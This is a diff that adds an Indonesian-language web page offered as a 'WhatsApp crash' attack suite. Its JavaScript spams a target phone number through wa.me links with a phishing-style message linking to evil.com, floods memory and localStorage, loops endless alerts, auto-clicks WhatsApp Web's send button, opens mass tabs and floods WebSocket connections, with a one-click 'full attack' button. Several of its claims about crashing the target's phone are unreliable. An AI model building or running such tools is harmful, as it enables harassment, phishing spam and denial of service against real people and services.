@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>✅ CRASH WHATSAPP - FULL ATTACK SUITE</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
+        .container { max-width: 900px; margin: auto; background: #111; border: 2px solid #0f0; padding: 25px; border-radius: 15px; }
+        h1 { text-align: center; color: #f00; text-shadow: 0 0 20px #f00; }
+        .modul { background: #1a1a1a; border: 1px solid #0f0; padding: 15px; margin: 15px 0; border-radius: 8px; }
+        .modul h2 { color: #ff0; border-bottom: 1px dashed #0f0; padding-bottom: 5px; }
+        input, textarea, select, button { width: 100%; padding: 10px; margin: 5px 0; background: #222; color: #0f0; border: 1px solid #0f0; font-family: inherit; }
+        button { background: #0f0; color: #000; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #0a0; }
+        .tombol-bahaya { background: #f00; color: #fff; border-color: #f00; }
+        .tombol-bahaya:hover { background: #c00; }
+        #log { background: #000; border: 1px solid #0f0; padding: 10px; height: 200px; overflow-y: scroll; font-size: 12px; }
+        .flex { display: flex; gap: 10px; }
+        .flex > * { flex: 1; }
+        .keterangan { color: #aaa; font-size: 12px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>⚡ CRUSH WHATSAPP 100% ⚡</h1>
+    <p style="text-align:center;color:#f00;">⚠️ GUNAKAN UNTUK UJI KEAMANAN PRIBADI ⚠️</p>
+
+    <!-- MODUL 1: PENGIRIM PESAN MASSAL VIA WA.ME -->
+    <div class="modul">
+        <h2>1. BOMBING via wa.me (Link Spam)</h2>
+        <div class="flex">
+            <input type="text" id="targetNumber" placeholder="Nomor target (misal: 6281234567890)" value="6281234567890">
+            <input type="number" id="jumlahPesan" placeholder="Jumlah pesan" value="1000">
+        </div>
+        <textarea id="pesanMassal" rows="2" placeholder="Isi pesan">⚠️ UPDATE KEAMANAN WAJIB ⚠️ Klik link ini: http://evil.com/hack</textarea>
+        <button onclick="startWaMeSpam()">🚀 KIRIM MASSAL (wa.me)</button>
+        <p class="keterangan">Membuka ribuan tab wa.me secara bergantian – membuat aplikasi WA di HP target crash karena notifikasi overload.</p>
+    </div>
+
+    <!-- MODUL 2: SERANGAN MEMORI (LEAK) -->
+    <div class="modul">
+        <h2>2. MEMORY LEAK / STORAGE OVERFLOW</h2>
+        <button onclick="startMemoryLeak()" class="tombol-bahaya">💥 LEAK MEMORY (Browser Hang)</button>
+        <button onclick="startLocalStorageFlood()" class="tombol-bahaya">💥 FLOOD localStorage (Crash)</button>
+        <p class="keterangan">Mengisi RAM dengan array besar / menulis data besar ke localStorage – membuat browser/WA Web hang.</p>
+    </div>
+
+    <!-- MODUL 3: AUTO CLICKER & INFINITE ALERT -->
+    <div class="modul">
+        <h2>3. AUTO CLICK + INFINITE ALERT</h2>
+        <button onclick="startInfiniteAlert()" class="tombol-bahaya">🔁 ALERT SPAM (Tak Berhenti)</button>
+        <button onclick="startAutoClick()" class="tombol-bahaya">🖱️ AUTO CLICK (Jika WA Web terbuka)</button>
+        <p class="keterangan">Membuat dialog alert tak berujung, atau mensimulasikan klik pada tombol kirim WA Web secara otomatis.</p>
+    </div>
+
+    <!-- MODUL 4: MULTI TAB OPENER -->
+    <div class="modul">
+        <h2>4. MULTI TAB WHATSAPP WEB</h2>
+        <input type="number" id="jumlahTab" placeholder="Jumlah tab" value="50">
+        <button onclick="openMultipleTabs()">📂 BUKA 50+ TAB WA WEB</button>
+        <p class="keterangan">Membuka banyak tab web.whatsapp.com – menyebabkan overload pada session dan memory.</p>
+    </div>
+
+    <!-- MODUL 5: WEBSOCKET FLOOD (SIMULASI) -->
+    <div class="modul">
+        <h2>5. WEBSOCKET FLOOD (untuk WA Web)</h2>
+        <button onclick="startWebSocketFlood()" class="tombol-bahaya">🌊 FLOOD WEBSOCKET</button>
+        <p class="keterangan">Mencoba membuka koneksi WebSocket palsu ke domain whatsapp (hanya untuk demo, tidak valid).</p>
+    </div>
+
+    <!-- LOG -->
+    <div class="modul">
+        <h2>📋 LOG AKTIVITAS</h2>
+        <div id="log">[SISTEM SIAP]</div>
+        <button onclick="clearLog()">Bersihkan Log</button>
+    </div>
+</div>
+
+<script>
+    // =============== LOGGING ===============
+    function log(msg) {
+        const logDiv = document.getElementById('log');
+        const time = new Date().toLocaleTimeString();
+        logDiv.innerHTML += `[${time}] ${msg}\n`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    function clearLog() {
+        document.getElementById('log').innerHTML = '[LOG DIHAPUS]';
+    }
+
+    // =============== MODUL 1: WA.ME SPAM ===============
+    function startWaMeSpam() {
+        const nomor = document.getElementById('targetNumber').value.trim();
+        const pesan = document.getElementById('pesanMassal').value.trim();
+        const jumlah = parseInt(document.getElementById('jumlahPesan').value) || 1000;
+        if (!nomor || !pesan || jumlah < 1) {
+            log('❌ Lengkapi nomor, pesan, dan jumlah!');
+            return;
+        }
+        log(`🚀 Memulai spam wa.me ke ${nomor} sebanyak ${jumlah} kali...`);
+        const encoded = encodeURIComponent(pesan);
+        let count = 0;
+        const interval = setInterval(() => {
+            if (count >= jumlah) {
+                clearInterval(interval);
+                log(`✅ Selesai mengirim ${jumlah} pesan via wa.me`);
+                return;
+            }
+            const url = `https://wa.me/${nomor}?text=${encoded}`;
+            // Buka di tab baru, tapi kita batasi agar tidak membuka terlalu banyak sekaligus
+            const win = window.open(url, '_blank');
+            if (win) {
+                setTimeout(() => win.close(), 500); // tutup cepat agar tidak memenuhi tab
+            }
+            count++;
+            if (count % 50 === 0) log(`📤 Sudah ${count} pesan terkirim...`);
+        }, 100); // 100ms antar kirim, bisa diatur lebih cepat
+    }
+
+    // =============== MODUL 2: MEMORY LEAK ===============
+    function startMemoryLeak() {
+        log('💥 Menjalankan memory leak (array besar) ...');
+        let arr = [];
+        for (let i = 0; i < 10; i++) {
+            arr.push(new Array(1000000).fill('X'));
+            log(`🔴 Alokasi array ke-${i+1} (1 juta elemen)`);
+        }
+        // Simpan secara global agar tidak di-GC
+        window.leakArray = arr;
+        log('✅ Array raksasa disimpan – browser akan mulai lag/hang');
+        alert('Memory leak selesai. Browser mungkin crash dalam beberapa detik.');
+    }
+
+    function startLocalStorageFlood() {
+        log('💥 Menulis data besar ke localStorage ...');
+        let data = '';
+        for (let i = 0; i < 100000; i++) data += 'A';
+        try {
+            for (let i = 0; i < 1000; i++) {
+                localStorage.setItem('flood_' + i, data);
+                if (i % 100 === 0) log(`📦 Tulis chunk ke-${i}`);
+            }
+        } catch (e) {
+            log(`❌ Gagal menulis: ${e.message} (mungkin storage penuh)`);
+        }
+        alert('localStorage flood selesai. Cek kinerja browser.');
+    }
+
+    // =============== MODUL 3: INFINITE ALERT & AUTO CLICK ===============
+    function startInfiniteAlert() {
+        log('🔁 Memulai infinite alert ...');
+        function loopAlert() {
+            alert('⚠️ CRASH WHATSAPP 100% ⚠️');
+            setTimeout(loopAlert, 1); // Panggil lagi segera
+        }
+        // Jalankan beberapa thread alert
+        for (let i = 0; i < 5; i++) {
+            setTimeout(loopAlert, i * 100);
+        }
+        log('✅ 5 thread alert aktif – aplikasi akan hang');
+    }
+
+    function startAutoClick() {
+        log('🖱️ Memulai auto click pada tombol kirim WA Web (jika terbuka)');
+        // Cari elemen tombol kirim di web.whatsapp.com
+        setInterval(() => {
+            // Selector untuk tombol kirim (bisa berubah)
+            const btns = document.querySelectorAll('button[data-testid="compose-btn-send"]');
+            if (btns.length) {
+                btns.forEach(btn => btn.click());
+                log('👉 Klik tombol kirim ditemukan dan diklik!');
+            } else {
+                // Coba alternatif
+                const sendBtns = document.querySelectorAll('button[type="submit"]');
+                sendBtns.forEach(btn => btn.click());
+            }
+        }, 100);
+        log('✅ Auto click aktif – setiap 100ms mencoba klik');
+    }
+
+    // =============== MODUL 4: MULTI TAB ===============
+    function openMultipleTabs() {
+        const jumlah = parseInt(document.getElementById('jumlahTab').value) || 50;
+        log(`📂 Membuka ${jumlah} tab WhatsApp Web ...`);
+        for (let i = 0; i < jumlah; i++) {
+            window.open('https://web.whatsapp.com/', '_blank');
+            if (i % 10 === 0) log(`📑 Tab ke-${i+1} dibuka`);
+        }
+        log('✅ Semua tab dibuka – perhatikan beban memori');
+    }
+
+    // =============== MODUL 5: WEBSOCKET FLOOD ===============
+    function startWebSocketFlood() {
+        log('🌊 Mencoba WebSocket flood ke domain whatsapp ...');
+        // Buat banyak koneksi WebSocket palsu (tidak valid, hanya untuk load)
+        for (let i = 0; i < 50; i++) {
+            try {
+                const ws = new WebSocket('wss://web.whatsapp.com/ws');
+                ws.onopen = () => {
+                    ws.send('x'.repeat(1000));
+                    log(`🔗 WS #${i} terbuka`);
+                };
+                ws.onerror = () => { /* ignore */ };
+            } catch (e) {
+                log(`❌ WS #${i} gagal: ${e.message}`);
+            }
+        }
+        log('✅ 50 koneksi WS dicoba (mungkin gagal, tapi tetap memberatkan)');
+    }
+
+    // =============== MODUL TAMBAHAN: KOMBINASI SERANGAN ===============
+    // Fungsi untuk menjalankan semua serangan sekaligus (opsional)
+    function startFullAttack() {
+        log('🔥 MELUNCURKAN SEMUA SERANGAN SECARA BERSAMAAN 🔥');
+        startMemoryLeak();
+        setTimeout(startLocalStorageFlood, 500);
+        setTimeout(startInfiniteAlert, 1000);
+        setTimeout(() => openMultipleTabs(), 1500);
+        setTimeout(startWebSocketFlood, 2000);
+        // Juga jalankan auto click jika WA Web terbuka
+        startAutoClick();
+        // Dan spam wa.me
+        // Ambil dari input
+        const nomor = document.getElementById('targetNumber').value.trim();
+        const pesan = document.getElementById('pesanMassal').value.trim();
+        if (nomor && pesan) {
+            document.getElementById('jumlahPesan').value = '500';
+            setTimeout(startWaMeSpam, 3000);
+        }
+        log('⚡ SEMUA MODUL AKTIF – SIAPKAN CRASH ⚡');
+    }
+
+    // Tambahkan tombol untuk full attack di bawah
+    document.addEventListener('DOMContentLoaded', function() {
+        const container = document.querySelector('.container');
+        const fullBtn = document.createElement('button');
+        fullBtn.textContent = '☠️ FULL ATTACK (SEMUA MODUL) ☠️';
+        fullBtn.className = 'tombol-bahaya';
+        fullBtn.style.fontSize = '20px';
+        fullBtn.style.padding = '20px';
+        fullBtn.onclick = startFullAttack;
+        container.prepend(fullBtn);
+        log('✅ Sistem siap. Tekan tombol merah untuk serangan total.');
+    });
+
+    // Juga tambahkan handler untuk mendeteksi jika di dalam iframe WA Web, tapi tidak perlu
+    console.log('CRASH WHATSAPP SUITE LOADED');
+</script>
+</body>
+</html>
